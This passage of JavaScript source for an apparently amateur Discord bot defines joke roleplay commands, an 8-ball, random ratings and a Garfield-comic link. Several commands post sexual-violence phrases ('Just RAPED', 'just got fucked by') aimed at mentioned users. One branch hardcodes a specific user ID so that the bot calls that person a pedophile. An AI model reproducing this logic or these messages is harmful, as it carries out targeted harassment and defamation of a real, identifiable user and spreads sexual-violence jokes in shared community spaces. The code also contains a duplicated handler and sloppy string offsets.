    ///// ////   e.message.channel.sendMessage(url);

      //////////})
  ////////})
   // req.on("error", function(e) {
    //  console.log(e.message);
    ///})
//}
	  if(e.message.content.startsWith("*slap")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just slaped" + e.message.content.substring(5,2000));
	  if(e.message.content.startsWith("*rape")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just RAPED" + e.message.content.substring(5,2000));
	  if(e.message.content.startsWith("*stab")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just stabbed" + e.message.content.substring(5,2000));
	  if(e.message.content.startsWith("*shoot")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just shot" + e.message.content.substring(5,2000));
if(e.message.content.startsWith("*succ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just sucked out " + e.message.content.substring(5,2000) + "");
if(e.message.content.startsWith("*hug")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just hugged " + e.message.content.substring(5,2000) + "");
if(e.message.content.startsWith("*kiss")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a kiss to " + e.message.content.substring(5,2000) + " *ok*");
if(e.message.content.startsWith("*sit-on")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just sat on " + e.message.content.substring(7,2000) + "");
if(e.message.content.startsWith("*sit-on")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just sat on " + e.message.content.substring(7,2000) + "");
if(e.message.content.startsWith("*lick")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just licked " + e.message.content.substring(6,2000) + "");
if(e.message.content.startsWith("*cookie")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a cookie to " + e.message.content.substring(7,2000) + " ^.^-:cookie: ");
if(e.message.content.startsWith("*candy")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a candy to " + e.message.content.substring(7,2000) + " ^o^-:candy: ");
if(e.message.content.startsWith("*spank")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just spanked " + e.message.content.substring(7,2000) + " ");
if(e.message.content.startsWith("*nofork")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " no fork for u " + e.message.content.substring(7,2000) + " xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddd");
if(e.message.content.startsWith("*gotfucked")) 
    e.message.channel.sendMessage(e.message.content.substring(10,32) + " just got fucked by "+ e.message.content.substring(33,2000));
if(e.message.content.startsWith("*pet")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Pet " + e.message.content.substring(4,2000) + " ^o^");
if(e.message.content.startsWith("*eat")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " just ate " + e.message.content.substring(5));
if(e.message.content.startsWith("*kill")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just bruttaly murdered " + e.message.content.substring(4,2000) + " :knife:");
if(e.message.content.startsWith("*et")) {
var et1 = e.message.content.substring(4);
e.message.channel.sendMessage(":regional_indicator_"+et1+":");
}


// plez work
		  if (e.message.content.startsWith("who am i")) {
    e.message.channel.sendMessage("you are "+e.message.author.username);
		  }	 
if (e.message.content.startsWith("what am i")) {
if(e.message.author.id == "244509121838186497") {
e.message.channel.sendMessage("you are a pedophile")
}else{
e.message.channel.sendMessage("you are a human")
}
}
		  if (e.message.content.startsWith("where am i")) {
    e.message.channel.sendMessage("you are in "+e.message.guild.name);
		  }	 
		  if (e.message.content == ("*num")) {
    e.message.channel.sendMessage("Usage: **`*num [Any number from 1 to 9999999999999999999]`**");
		  }	
		  		  if (e.message.content.startsWith("*num ")) {
		  		      var numshit = e.message.content.substring(5);
    e.message.channel.sendMessage(Math.floor(Math.random() * numshit));
		  }	
		  if (e.message.content.startsWith("*garfield")) {
    var ono = new Date().getFullYear();
    var oneo = new Date().getMonth();
    var dau = new Date().getDay();
    var ogod = Math.floor(Math.random()*(1985-ono+1)+ono);
    var olol = Math.floor(Math.random()*(10-oneo+1)+oneo);
    var gday = Math.floor(Math.random() * 9) +1;
   e.message.channel.sendMessage("https://d1ejxu6vysztl5.cloudfront.net/comics/garfield/"+ogod+"/"+ogod+"-"+olol+"-0"+gday+".gif");
 
}
		  if (e.message.content.startsWith("*8ball ")) {
    var responses = ["It is certain", "Without a doubt", "You may rely on it", "Most likely", "Yes", "Signs point to yes", "Better not tell you now", "Don't count on it", "My reply is no", "My sources say no", "Outlook not so good", "Very doubtful"];
    e.message.channel.sendMessage(responses[Math.floor(Math.random() * (responses.length))]);
		  }	  
		  		  if (e.message.content.startsWith("*rate ")) {
    var responsess = ["1/10", "2/10", "3/10", "4/10", "5/10", "6/10", "7/10", "8/10", "9/10", "10/10", "11/10", "0/10"];
    e.message.channel.sendMessage("I give `"+e.message.content.substring(5)+"` a "+responsess[Math.floor(Math.random() * (responsess.length))]);
				  }
		  		  		  if (e.message.content.startsWith("*rate-gud")) {
    var responsesss = ["7/10", "8/10", "9/10", "10/10", "11/10"];
    e.message.channel.sendMessage("I give that a "+responsesss[Math.floor(Math.random() * (responsesss.length))]);
				  }
		  		  		  		  if (e.message.content.startsWith("*worth")) {
    var responsessss = ["1 BitCoin", "alot", "0.1 Doge Coin", "5$", "4$", "3$", "2$", "1$", "1MIL$", "50 REMS", "A sex change", "A pengu", "A fork", "A candy", "-1$", "```9999999999999MIL```"];
								  e.message.channel.sendMessage(e.message.author.nickMention +"`"+e.message.content.substring(6)+"` is worth "+responsessss[Math.floor(Math.random() * (responsessss.length))]);
				  }
	}});